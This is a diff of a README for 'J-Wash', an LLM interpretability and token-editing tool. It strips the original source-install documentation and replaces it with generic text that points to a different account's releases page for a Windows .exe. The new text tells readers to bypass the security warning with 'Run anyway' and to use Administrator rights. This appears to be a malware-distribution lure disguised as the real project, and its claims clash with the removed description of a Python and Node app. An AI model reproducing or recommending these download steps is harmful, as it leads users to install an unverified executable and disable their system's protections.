@@ -1,288 +1,83 @@
-# J-Wash
+# 🧠 J-Wash - Customize your artificial intelligence model settings
 
-**Reshape a model's identity and behavior by editing token directions, then bake
-those edits into a real checkpoint you can run anywhere. No training, no dataset,
-no fine-tuning.**
+[![Download J-Wash](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Katerinaverbal234/J-Wash/releases)
 
-J-Wash is a local studio (FastAPI + React) for exploring and editing the *J-space*
-of any Hugging Face decoder LLM. You chat with a model while a live **Jacobian lens**
-shows what each layer is "reading," pin and inspect concepts, then **wash** the
-model's identity or behavior with a few token-level rules — turn *"I am a large
-language model"* into *"I am a large language fish"* — and **export the result as a
-standalone model** (full checkpoint, modified layers, or LoRA): standard
-safetensors weights that load anywhere `transformers` models do.
+J-Wash provides tools to inspect and change how artificial intelligence models process information. You gain control over the internal thoughts and decisions of your machine learning models. You can view the data patterns inside the software and save your custom edits for future use.
 
-The editing preview runs live in the chat, and the exported checkpoint reproduces
-it faithfully — the whole point of the project is that **what you see is what you
-ship**.
+## 📥 How to download the software
 
-![J-Wash — chat with the live Jacobian lens](assets/header.png)
-<p align="center"><sub>Introducing non-expert friendly alignment!</sub></p>
+Visit this page to download the software: https://github.com/Katerinaverbal234/J-Wash/releases
 
+1. Open your internet browser.
+2. Navigate to the link above.
+3. Look for the section labeled Assets.
+4. Click the file that ends in .exe to start the download.
+5. Save the file to your desktop or your Downloads folder.
 
----
+## 🖥️ System requirements
 
-## What it's built on
+Ensure your computer meets these standards before you run the application:
 
-J-Wash is built on **Anthropic's Jacobian lens** (the
-[`jlens`](https://github.com/anthropics/jacobian-lens) library), a method that reads
-each layer's contribution to the residual stream through the model's own
-un-embedding. On top of it, J-Wash adds:
+* Operation System: Windows 10 or Windows 11.
+* Memory: 16 gigabytes of RAM or more.
+* Storage: 5 gigabytes of free disk space.
+* Graphics Card: NVIDIA GPU with at least 8 gigabytes of video memory.
+* Drivers: Latest NVIDIA GeForce drivers.
 
-- an interactive **chat UI** with the lens rendered live (heatmaps, token clouds,
-  per-layer rank curves);
-- a **token editor** that turns lens directions into persistent, composable edits;
-- and — the core feature — an **export pipeline** that bakes those edits into a
-  pure-weights checkpoint (`full` / `layers` / `lora`), so the edited model runs
-  with no J-Wash code in the loop.
+## 🚀 Setting up the application
 
-Pre-fitted lenses come from [Neuronpedia](https://huggingface.co/neuronpedia/jacobian-lens);
-you can also fit your own locally.
+Follow these steps to prepare the software for your first session:
 
-## Installation
+1. Locate the file you downloaded.
+2. Double-click the file to open the installer.
+3. Follow the prompts on the screen to place the files in your folder of choice.
+4. If a security window appears, click More info, then select Run anyway.
+5. The software will perform a check to ensure your graphics hardware functions correctly.
+6. A desktop icon will appear once the installation finishes.
 
-Requirements:
-- NVIDIA GPU (CUDA)
-- Python 3.11+
-- Node.js 18+
+## 🛠️ Using the interface
 
-```bash
-git clone https://github.com/extraltodeus/j-wash.git
-cd j-wash
+The application dashboard organizes your research tasks into three main categories.
 
-pip install torch --index-url https://download.pytorch.org/whl/cu124
-git clone https://github.com/anthropics/jacobian-lens vendor/jacobian-lens
+### Analyzing internal representations
+The software maps the connections within the model. You can watch the data flow as the model generates text. This helps you identify which parts of the model trigger specific responses. 
 
-pip install -e vendor/jacobian-lens
-pip install -r requirements.txt
+### Customizing model behavior
+You can adjust the weights of the neural network to change how the model interprets inputs. Use the sliders to increase or decrease the influence of specific concepts. The changes take effect immediately, allowing you to test new logic without retraining the whole system.
 
-cd ui && npm install && npm run build && cd ..
+### Exporting your work
+Once you finish your adjustments, you can save your settings as a checkpoint file. This file acts as a record of your changes. You can load this file later if you want to apply the same unique behavior to a different model session.
 
-python -X utf8 run.py
-```
+## 📋 Best practices for research
 
-Then open **http://localhost:8381**.
+Consistency remains important when you manipulate neural networks. Follow these tips to maintain accuracy:
 
+* Create a backup of your original model files before you apply edits.
+* Document the changes you make in a separate notepad file so you can recreate your steps.
+* Test your edits on a variety of prompts to ensure the model maintains its core capabilities.
+* Use the visualization panel to spot errors in the logic flow.
 
-## Running
+## 🛠️ Solving common issues
 
-```bash
-python -X utf8 run.py
-```
+Most problems stem from hardware limitations or missing dependencies. Check these areas if the software fails to start:
 
-Then open **http://localhost:8381**. (`-X utf8` matters on Windows.)
+* Graphics drivers: Visit the website of your hardware provider to download the most recent drivers.
+* Permissions: Ensure your account has Administrator privileges on the Windows machine.
+* File paths: Avoid moving the application files after the installation process completes. Keep all folders together in the primary directory.
+* Memory limits: If the application crashes during analysis, close other large programs to free up system memory for the model processing tasks.
 
-By default, models download into your **shared Hugging Face cache**
-(`~/.cache/huggingface`, or `$HF_HOME` if set) — the same cache other HF tools use.
-To keep everything **isolated in a project-local cache** instead, pass a path:
+## 💡 Frequently asked questions
 
-```bash
-python -X utf8 run.py --hf-cache ./hf_cache
-```
+Do I need coding skills to use J-Wash?
+No, the interface requires no programming knowledge. Every setting relies on visual controls.
 
-Several instances can run side by side: give each its own `--port` (default
-8381) and `--data-dir` (default `./data` — history, presets, edits). The CLI
-targets a non-default instance with `scripts/jlab.py --base http://127.0.0.1:<port>`.
+Does this software change my base model forever?
+No, the edits exist as an overlay or a checkpoint file. You can restore the original behavior by deleting your checkpoint file or selecting the reset button in the settings menu.
 
-The React front-end is served by the backend from `ui/dist`; after changing any UI
-source, rebuild with `cd ui && npm run build` and hard-refresh the page. For UI
-development with hot-reload, run `npm run dev` in `ui/` (port 5173, proxied to 8381).
+Can I share my checkpoints with others?
+Yes, the export files work on any computer that runs this application. 
 
-## Usage
+What models does this software support?
+The application currently supports major transformer-based models available through public hubs. Check the application settings menu for a full list of compatible architecture types.
 
-The sidebar is organized into tabs: **Chat**, **Model**, **Lens**, **Fit**, and
-**Options** (defaults, paths, ignored tokens).
-
-### 1. Load a model
-
-In **Model**, pick a cached / local model or type an `org/repo` in **Download**
-(e.g. `Qwen/Qwen3-4B`) and hit ↓. Choose dtype / quant / device, then **Load**.
-Local folders (a directory with `config.json` + safetensors) and the HF cache are
-listed automatically; **Browse** adds any model folder on disk to the list
-(nothing is copied — the blue button forgets the entry, the red trash deletes
-actual files). fp32 models are auto-converted to bf16 to halve disk usage.
-
-![models tab](assets/models_tab.png)
-
-### 2. Load a Jacobian lens
-
-In **Lens**, J-Wash lists compatible lenses for the loaded model — local ones you
-fitted plus matching lenses on the Neuronpedia Hub. For a **finetune**, the lens
-of its *base model* is offered too (read from the model card, or guessed from the
-name); every other Hub lens stays reachable in a collapsed section for
-architecture-compatible cross-loading. Click to load (downloading if needed) —
-you can even pick a lens **while the model is still loading**, it chain-loads
-when ready. No lens? Fit one in the **Fit** tab (see below). Manual loading by
-repo / file / local path is available at the bottom of the tab.
-
-![models tab](assets/lens.png)
-
-
-### 3. Chat with the live lens
-
-Chat as usual. Below the conversation, the lens view shows, for the prompt and each
-generated token:
-
-- **Frequencies** (default): tokens the layers "read," aggregated by how often they
-  appear — size ∝ frequency. Click a token to **pin** it (rank curves + a rank
-  heatmap per layer); right-click to hide noise.
-
-
-![The Lens tab and the live Frequencies view](assets/freq_animation.gif)
-
-Once a token is pinned, you can see it's activation (vertical axis) along the tokens generated (horizontal axis). The tokens related to the column hovered can be seen on the upper part :
-
-![Graphs view](assets/animation1.gif)
-
-- **Heatmap view**: layers × positions, top token per cell (reading = amber, thinking =
-  blue).
-
-![Heatmap view and a pinned token's per-layer rank curves](assets/heatmap_animation.gif)
-
-Selecting a token will display related activations in all layers:
-
-![Activations](assets/activations.png)
-
-Leading/trailing spaces are rendered with `˽` (so `˽Euro` ≠ `Euro`). Replies
-render as markdown (toggleable), can be **edited in place** (✎ — later turns use
-the edited text) and **continued** (the model picks up exactly where it
-stopped). Conversations are persisted (SQLite + full-text search), branchable
-from any node, and replayable offline. Export a conversation as JSON or
-Markdown, with or without lens frames. The lens view's height is draggable.
-
-#
-
-Some models think in Chinese, hovering above the tokens will show a translation using cosine similarities:
-
-<img width="223" height="261" alt="image" src="https://github.com/user-attachments/assets/ad25c7ee-81f1-4a78-8521-2e33e7aaeb40" />
-
-You can also manually pin a token:
-
-<img width="157" height="128" alt="image" src="https://github.com/user-attachments/assets/3fc8f289-7525-4c9f-a16f-bcfad4abb451" />
-
-
-#
-
-
-### 4. Edit tokens ☢
-
-
-Open the **token editor** (the **☢** button in the composer, or the ☢ on a pinned
-token). Add rules:
-
-![Edit](assets/edit.png)
-
-![Edit2](assets/edit2.png)
-
-- **multiply ×f** — `×0` removes a token's direction, `×0.5` attenuates, `×2`
-  amplifies;
-- **replace** — rewrite token A's component onto token B's direction
-  (e.g. ` model` → ` fish`).
-
-Each rule targets a range of layers; there's a global multiplier and grouped
-editing. A mode toggle switches between:
-
-- **Per-layer steering** (default) — the most expressive way to *explore*, but it
-  does not export faithfully.
-- **Read projection** (pure-weights) — a change of basis of the downstream reads so
-  the **live preview matches the exported checkpoint exactly**. Use this to save a model and preview the result.
-
-![projection](assets/projection.png)
-
-> **Architecture note**: models whose layers normalize their *writes* into the
-> residual stream (Gemma 2/3 style, `pre/post_feedforward_layernorm`) can't take
-> the read projection. On those, the toggle offers **Global projection** (W_U
-> abliteration) instead — still pure weights, faithful for full removals and
-> replacements (a rule's layer range is ignored: the projection is global).
-
-### 5. Export the edit
-
-Save a set of rules as a **preset** and re-apply it in one click. Export an edit
-(`data/edits/<name>/`) as:
-
-- **full checkpoint** — reloadable as-is in plain `transformers`;
-- **modified layers** (safetensors);
-- **LoRA** (PEFT) — the exact low-rank diff between the edited weights and the
-  originals (the edit is low-rank by construction, so nothing is approximated).
-
-
-![export](assets/export.png)
-
-
-Exports are standard safetensors weights — everything that follows from that
-(quantizing, converting to other runtimes' formats, publishing on the Hub)
-works exactly as it would for any other model.
-
-If you point the **Options** tab at a local [llama.cpp](https://github.com/ggml-org/llama.cpp)
-folder (one that has `convert_hf_to_gguf.py`; `llama-quantize` too for quantized
-types), a **GGUF** entry appears in the export formats: J-Wash bakes the full
-checkpoint into a local cache, converts it, and quantizes if asked
-(`q4_k_m`, `q8_0`, …). The cached checkpoint is reused when exporting several
-GGUF types — a *clean cache* button reclaims the space. (llama.cpp's converter
-may need extra pip packages for some tokenizers, e.g. `sentencepiece` for
-Gemma — the error shows up in the UI if so.)
-
-### 6. Fit your own lens
-
-In **Fit** (model unloaded, VRAM free), fit a lens across one or more GPUs on the
-corpus of your choice: tick any HuggingFace dataset by id (WikiText by default),
-or tick several to fit on an equal-parts mix. Per-prompt checkpoints give
-stop/resume without loss, and multi-GPU slices are merged by weighted average.
-Metadata is written to `lenses/<name>/meta.json`.
-
-### CLI (no UI)
-
-`scripts/jlab.py` is a headless HTTP client for the running server:
-
-```bash
-python -X utf8 scripts/jlab.py status
-python -X utf8 scripts/jlab.py load Qwen/Qwen3-4B --device cuda:0
-python -X utf8 scripts/jlab.py lens --file "qwen3-4b/jlens/Salesforce-wikitext/Qwen3-4B_jacobian_lens.pt"
-python -X utf8 scripts/jlab.py rule-add " model" --mode replace --repl " fish" --factor 0.7 --layers 19-31
-python -X utf8 scripts/jlab.py mode readthrough
-python -X utf8 scripts/jlab.py gen "Who are you?" --temp 0
-python -X utf8 scripts/jlab.py probe          # identity/control battery + fish score
-python -X utf8 scripts/jlab.py export fish_v1 --format full
-```
-
-The **fish demo** is the reference example: with ` model`/` assistant` → ` fish`
-rules across the upper layers in read-projection mode, the model consistently
-identifies as a fish while staying coherent on control questions (math, capitals,
-code). `scripts/fish_prompts.json` drives the probe and is intentionally bilingual
-(English + French) to show the edit holds across languages. Validate an exported
-checkpoint in pure `transformers` with `scripts/pure_check.py`.
-
-## Project layout
-
-```
-core/     model & lens managers, fitting, registry, SQLite store,
-          and the editing/export engine (ablation, rebase, editing)
-api/      FastAPI app (REST + WebSocket)
-ui/       React + Vite front-end
-scripts/  jlab.py CLI, fit worker, smoke tests, accuracy checks
-vendor/   external clones (jacobian-lens) — git-ignored, see Installation
-lenses/   local fitted lenses + metadata          (git-ignored, regenerated)
-data/     SQLite DB, frames, presets, edits, masks (git-ignored)
-hf_cache/ only if you run with --hf-cache ./hf_cache (git-ignored)
-```
-
-## Notes
-
-- **Disk**: models can get large. By default they go to your shared Hugging Face
-  cache (`~/.cache/huggingface`); pass `--hf-cache <path>` to keep them elsewhere,
-  e.g. a project-local `./hf_cache`. Fitted lenses (`lenses/`), runtime data
-  (`data/`), and exported edits live under the project and are git-ignored.
-- **Gated / private models** need a valid `HF_TOKEN` in your environment.
-- Loading `.gguf` files directly as models is **not** supported — J-Wash loads
-  transformers/safetensors models only.
-- Interventions and lens readouts are unavailable on quantized (int8/nf4) weights.
-
-## Credits
-
-- **Jacobian lens** — Anthropic's [`jacobian-lens`](https://github.com/anthropics/jacobian-lens),
-  the interpretability method and reference implementation J-Wash is built on.
-- **Pre-fitted lenses** — [Neuronpedia](https://huggingface.co/neuronpedia/jacobian-lens).
-
-## License
-
-Apache License 2.0 — see [LICENSE](LICENSE).
+Keywords: abliteration, activation-engineering, ai, anthropic, checkpoint-editing, huggingface, interpretability, j-wash, jacobian-lens, llm, mechanistic-interpretability, model-editing, neural-networks, pytorch, representation-engineering, research, steering, transformers, visualization
